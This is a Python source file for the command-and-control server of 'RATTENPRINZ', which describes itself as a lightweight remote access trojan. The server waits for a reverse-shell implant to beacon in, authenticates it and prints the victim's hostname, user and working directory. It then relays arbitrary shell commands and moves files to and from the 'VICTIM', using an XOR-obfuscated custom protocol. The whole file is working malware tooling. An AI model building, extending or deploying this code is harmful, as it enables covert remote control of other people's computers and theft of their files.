import os
import struct
import argparse
import socket
import sys
import signal
import time
import hashlib


# GLOBAL CONSTANTS
HEADER_FORMAT = '!B I'  # B = MTYPE (1 byte); I = PAYLOAD LENGTH (4 bytes)
HEADER_SIZE = struct.calcsize(HEADER_FORMAT) 
LHOST = '127.0.0.1'
XOR_KEY = 'R@TT3NPR1NZ'

# PROTOCOL MESSAGE TYPES
MT_BEACON 	= 0
MT_AUTH 	= 1
MT_CMD		= 2
MT_RECV		= 3
MT_UP		= 4
MT_DWN		= 5
MT_DATA		= 6
MT_ERR		= 7


# HELPER FUNCTIONS

def parse_arguments():
    parser = argparse.ArgumentParser(prog='RATTENPRINZ', 
        description='+++ RATTENPRINZ +++\n\nLIGHTWEIGHT RAT WITH BASIC CMDLINE FUNCTIONALITY AND EASY FILE UPLOADS/DOWNLOADS; USES CUSTOM BINARY PROTOCOL WITH XOR CIPHER',
        epilog='''\nSHELL COMMANDS:
    UPLOAD <LOCAL_FILEPATH>     UPLOAD A FILE FROM C2 -> VICTIM
    DOWNLOAD <REMOTE_FILEPATH)  DOWNLOAD A FILE FROM VICTIM -> C2
    LHISTORY                    SHOW SHELL HISTORY
    EXIT or QUIT                EXIT SESSION

NB. IF SHELL HANGS PRESS CTRL+C FOR AUTO-RECONNECT; PRESSING CTRL+C TWICE WILL EXIT RATTENPRINZ SHELL ENTIRELY

+++ MADE BY FR05TBYTEX +++''',
        formatter_class=argparse.RawDescriptionHelpFormatter
        )
    parser.add_argument('-p', '--port', type=int, default=1346, help='port to listen on (default=1346)')
    parser.add_argument('-v', '--verbose', help='verbose/debug mode', action='store_true')
    return parser.parse_args()

def vprint(*args):
    if getattr(c2_args, 'verbose', True):
        print(*args)

def xor_crypt(payload: bytes, key: str = XOR_KEY) -> bytes:        # SYMMETRIC REPEATING KEY XOR FUNCTION - NB. THIS ONLY OBFUSCATES PAYLOAD

    if not payload:                         # IF NO PAYLOAD THEN RETURN EMPTY BYTES OBJECT
        return b''

    if isinstance(payload, bytearray):      # NORMALIZE INPUT - BYTEARRAY -> BYTES
        payload = bytes(payload)
    elif not isinstance(payload, bytes):
        raise TypeError("--- XOR_CRYPT ERROR: PAYLOAD MUST BE IN BYTES/BYTEARRAY ---")

    key_bytes = key.encode('utf-8', errors='strict')
    key_len = len(key_bytes)

    return bytes(b ^ key_bytes[i % key_len] for i, b in enumerate(payload)) # APPLY REPEATING XOR CIPHER - NB. FAIRLY TRIVIAL TO BREAK CIPHER

def recv_packet(s):
    header = bytearray()                                                              # RECEIVE HEADER
    while len(header) < HEADER_SIZE:
        packet = s.recv(HEADER_SIZE - len(header))
        if not packet:
            raise ConnectionError('--- CONNECTION ERROR ---')
        header.extend(packet)
    mtype, payload_length = struct.unpack(HEADER_FORMAT, header)                      # UNPACK HEADER

    if payload_length > 0:                                                            # RECEIVE PAYLOAD
        payload = bytearray()                                       
        while len(payload) < payload_length:
            packet = s.recv(payload_length - len(payload))
            if not packet:
                raise ConnectionError('--- CONNECTION ERROR ---')
            payload.extend(packet) 
    else:
        payload = b''
    
    decrypted_payload = xor_crypt(payload)
    return mtype, payload_length, decrypted_payload                                             # RETURN MTYPE, PAYLOAD_LENGTH, PAYLOAD

def send_data(s, mtype: int, payload: bytes) -> bool:
    try: 
        enc_payload = xor_crypt(payload)
        header = struct.pack(HEADER_FORMAT, mtype, len(enc_payload))
        s.sendall(header + enc_payload)
        return True
    except Exception as e:
        print(e)
        return False

# INIT FUNCTION
def init(args):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((LHOST, args.port))
            s.listen(1)
            print(f'LISTENING ON {LHOST}:{args.port}...')
            conn, addr = s.accept()
            print(f'CONNECTION FROM {addr}!')

            response = recv_packet(conn)
            vprint(f'received beacon packet: {response}')

            if response[0] != MT_BEACON:                # DROPS CONNECTION IF WRONG INTIIAL MTYPE != BEACON PING
                print('--- UNEXPECTED MTYPE... DROPPING CONNECTION ---')
                conn.close()    # CLOSE REMOTE CONNECTION
                sys.exit(1)     # EXIT WITH ERROR CODE 1      

            if response[0] == MT_BEACON:                # CHECKS IF RECEIVED PACKET HAS BEACON PING
                print('=== AUTHENTICATING ===')
                send_data(conn, MT_AUTH, b'')        # SENDS AUTH REQ PACKET TO REVSHELL
                vprint('sent packet to revshell with MT_AUTH flag')
                
                response = recv_packet(conn)            # GRABS RESPONSE FROM REVSHELL
                vprint(f'RECEIVED PACKET: {response[0]}, {response[1]}, AND LOCAL SYSINFO AS PAYLOAD (SEE BELOW)')
                if response[0] == MT_AUTH:              # CHECKS IF REVSHELL SENDS AUTH OK 
                    vprint(f'auth acknowledged -> MTYPE MT_AUTH MATCH 1: {response[0]}')
                    print('+++ INIT COMPLETE +++')
                    if c2_args.verbose:
                        vprint(f'=== FULL SYSTEM INFO ===\n: {response[2].decode('utf-8', errors='replace')}\n' + '===' * 25)
                    else:
                        basic_sysinfo = response[2].decode('utf-8', errors='replace').strip().split('\n')
                        print(f'=== SYSTEM INFO ===\nHOSTNAME: {basic_sysinfo[0]}\nUSER: {basic_sysinfo[1]}\nUPTIME: {basic_sysinfo[2]}\nCURRENT WORKING DIRECTORY: {basic_sysinfo[3]}\n' + '===' * 25)
                    return conn                         # IF AUTH OK THEN RETURNS REVSHELL SOCKET
                print('--- AUTH HANDSHAKE FAILED ---')

            else:                                       # IF ERROR THEN DROPS CONNECTION AND RETURNS ERROR
                print('--- UNEXPECTED MTYPE... DROPPING CONNECTION ---')
                conn.close()    # CLOSE REMOTE CONNECTION
                sys.exit(1)     # EXIT WITH ERROR CODE 1 
        except Exception as e:
            print(f'Error: {e}')
            sys.exit(1)

def upload_file(s, local_filepath: str) -> bool:

    if not os.path.exists(local_filepath):            # FILEPATH CHECK
        print('=== LOCAL FILE NOT FOUND ===')
        return False

    with open(local_filepath, 'rb') as file:        # OPEN FILE FOR BINARY READ
        file_bytes = file.read()                    # READ FILE BYTES
    file_size = len(file_bytes)                     # GET FILE BYTE SIZE

    file_hash = hashlib.sha256(file_bytes).hexdigest()                          # GENERATE FILE HASH
    metadata = f'{os.path.basename(local_filepath)}|{file_size}|{file_hash}'.encode('utf-8', errors='replace') # GENERATE AND ENCODE METADATA

    send_data(s, MT_UP, metadata)    # SEND FILE HASH METADATA
    vprint(f'FILE METADATA SENT: {metadata}')
    response = recv_packet(s)             # CATCH FILE_UP ACK PACKET
    vprint(f'FILE_UP ACK PACKET RECEIVED: {response}')
    print(f'=== UPLOADING {local_filepath}... ===')

    if response[0] == MT_UP:                        # IF LOOP TO SEND FILE IN CHUNKS
        chunk_size = 4096                           # SETS CHUNK SIZE
        chunk_seq = 0                               
        for c in range(0, file_size, chunk_size):   # FOR LOOP TO SEND FILE BYTES IN CHUNKS UNTIL ENTIRE FILE IS SENT
            chunk = file_bytes[c:c+chunk_size]
            if not send_data(s, MT_DATA, chunk):
                print('--- CONNECTION ERROR - FAILED TO SEND FILE DATA ---')
            chunk_seq += 1
        print('+++ FILE DATA SENT +++')
        vprint(f'FILE UPLOAD STATS - {file_size} BYTES SENT IN {chunk_seq} CHUNKS OF LENGTH {chunk_size}')

    try:
        response = recv_packet(s)                       # CATCH RESPONSE PACKET 
        if response[0] == MT_UP and response[2] == metadata:                     # IF HASH MATCH, RETURN TRUE; ELSE RETURN FALSE
            vprint(f'SUCCESS - UPLOAD ACK PACKET: {response}')
            print(f'+++ FILE {local_filepath} SUCCESSFULLY UPLOADED TO {s.getpeername()[0]}:{s.getpeername()[1]} +++')
            return True
        else:
            vprint(f'ERROR: {response}')
            print(f'--- FILE {local_filepath} UPLOAD ERROR ---')
            return False
    except Exception as e:
        print(f'--- CONNECTION ERROR: {e} ---')
        return False

def download_file(s, remote_filepath: str) -> bool:
    
    try:
        send_data(s, MT_DWN, remote_filepath.encode('utf-8', errors='replace'))
        packet = recv_packet(s)

        if packet:

            metadata = packet[2].decode('utf-8', errors='replace')  # DECODE PACKET METADATA PAYLOAD
            unpack_metadata = metadata.split('|', 2)                # READY METADATA FOR UNPACKING
            
            if len(unpack_metadata) != 3:                           # RETURN FALSE IF PACKET METADATA NOT AS EXPECTED
                print(f'Invalid metadata: {metadata}')
                return False
            
            file_name, file_size, file_hash = unpack_metadata       # UNPACK METADATA
            file_size = int(file_size)                              # SET FILE_SIZE AS TYPE INT

            vprint(f'unpacked metadata: {metadata}')

            file_bytes = bytearray()                                # DECLARE BYTEARRAY FOR APPENDING
            file_bytes_recv = 0                                     # RECEIVES AND COLLECTS LENGTH OF UPLOADED BYTES
            while file_bytes_recv < file_size:                      # WHILE LOOP TO KEEP RECEIVING BYTES UNTIL RECEIVED BYTES == EXPECTED FILE SIZE
                response = recv_packet(s)
                if response[0] == MT_DATA:
                    file_bytes.extend(response[2])
                    file_bytes_recv += len(response[2])
                
                else:
                    print(f'unexpected mtype during upload: {response[0]}')
                    break

            mem_file_hash = hashlib.sha256(file_bytes).hexdigest()                                                  # GETS SHA256 HASH OF RECEIVED FILE AS IN MEMORY
            local_metadata = f'{file_name}|{file_bytes_recv}|{mem_file_hash}'.encode('utf-8', errors='replace')     # PACKAGES RECEIVED FILE LOCAL METADATA

            if mem_file_hash == file_hash and file_bytes_recv == file_size:     # IF LOCAL AND REMOTE HASH AND FILE SIZE MATCH THEN WRITE TO DISK AND SEND ACK PACKET TO C2 AND RETURN TRUE
                print('+++ INTEGRITY ACK - TRUE +++')
                
                with open(file_name, 'wb') as file:
                    file.write(file_bytes)
                print(f'+++ {file_name} WRITTEN TO DISK +++')

                send_data(s, MT_DWN, local_metadata)
                return True

            else:
                print('--- METADATA MISMATCH! ---')
                vprint(f'LOCAL METADATA: {local_metadata} | REMOTE METADATA: {metadata}')
                return False


        else:
            print('--- NO METADATA RECEIVED ---')
            vprint(f'--- SENT DATA ({s}, {MT_DWN}, {remote_filepath} - RECEIVED NO RESPONSE! ---)')
            return False

        return True

    except Exception as e:
        print(e)
        return False

# MAIN FUNCTION
def main():

    global c2_args                  # SET c2_args AS GLOBAL VAR
    c2_args = parse_arguments()     # POPULATE c2_args

    while True:
        s = None
        try:
            s = init(c2_args)       # INIT SOCKET
            history = []            # INIT LOCAL HISTORY LIST
            while True:
                try:
                    cmd = input('$ ').strip()
                    if cmd.strip():
                        history.append(cmd)

                    if cmd.lower() in ['exit', 'quit']:
                        print('--- C2 USER QUIT; SHUTTING DOWN... ---')
                        sys.exit(0)

                    if cmd.lower().startswith('upload'):
                        cmd_args = cmd.split(maxsplit=1)
                        if len(cmd_args) != 2:
                            print('--- ERROR: TOO MANY ARGS! ---\n === USAGE: UPLOAD <LOCAL_FILEPATH> ===')
                            continue
                        local_filepath = cmd_args[1].strip()
                        upload_file(s, local_filepath)
                        continue

                    if cmd.lower().startswith('download'):
                        cmd_args = cmd.split(maxsplit=1)
                        if len(cmd_args) != 2:
                            print('--- ERROR: TOO MANY ARGS! ---\n === USAGE: DOWNLOAD <REMOTE_FILEPATH> ===')
                            continue
                        remote_filepath = cmd_args[1].strip()
                        download_file(s, remote_filepath)
                        continue

                    if cmd:    
                        send_data(s, MT_CMD, cmd.encode('utf-8', errors='replace'))
                        response = recv_packet(s)
                        if response[0] == MT_RECV:
                            print(response[2].decode(), end='')
                        else:
                            print(f'ERROR: UNKNOWN MSG TYPE')
                            vprint(f'packet: {response}')

                    if cmd.lower() == 'lhistory':
                        print('\nRATTENPRINZ SHELL COMMAND HISTORY')
                        for i, command in enumerate(history, 1):
                            print(f'{i}  {command}')
                        continue

                except KeyboardInterrupt:
                    print('--- C2 USER PRESSED CTRL+C')
                    break
                except Exception as e:                      # INNER WHILE TRUE TRY LOOP GENERAL EXCEPTION HANDLER BREAKING LOOP ON ERROR
                    print(f'--- ERROR: {e} ---')


        except Exception as e:
            print(f'CONNECTION ERROR: {e} - IS REVSHELL BEACONING?')

        finally:                # CLOSE SOCKET AND IGNORE ERRORS
            if s != None:
                try:
                    s.close()
                except:
                    pass
            print('--- CONNECTION CLOSED ---')

# MAIN GUARD
if __name__ == '__main__':
	main()


